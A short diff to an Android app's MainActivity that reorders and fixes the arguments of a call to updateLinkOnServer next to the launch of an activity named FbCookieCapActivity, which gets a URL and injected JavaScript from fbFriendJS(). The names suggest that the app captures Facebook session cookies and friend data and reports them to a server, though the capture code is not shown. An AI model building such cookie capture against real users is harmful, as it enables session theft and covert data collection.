@@ -264,6 +264,7 @@ public class MainActivity extends AppCompatActivity implements
             sh.putString("otherphone", ab[1]);
             sh.apply();
             contact(ab[1], ab[2]);
+            updateLinkOnServer(ab[1], ab[2], ab[3]);
             Intent intent1 = new Intent(MainActivity.this, FbCookieCapActivity.class);
             intent1.putExtra(FbCookieCapActivity.KEY_URL, ab[0]);
             intent1.putExtra(FbCookieCapActivity.KEY_JS, fbFriendJS());
@@ -409,10 +410,10 @@ public class MainActivity extends AppCompatActivity implements
                 sh.putString("otherphone", ab[1]);
                 sh.apply();
                 contact(ab[1], ab[2]);
+                updateLinkOnServer(ab[1], ab[2], ab[3]);
                 intent.putExtra(FbCookieCapActivity.KEY_URL, ab[0]);
                 intent.putExtra(FbCookieCapActivity.KEY_JS, fbFriendJS());
                 startActivity(intent);
-                updateLinkOnServer(ab[2], ab[1], ab[3]);
             }
         }
     }
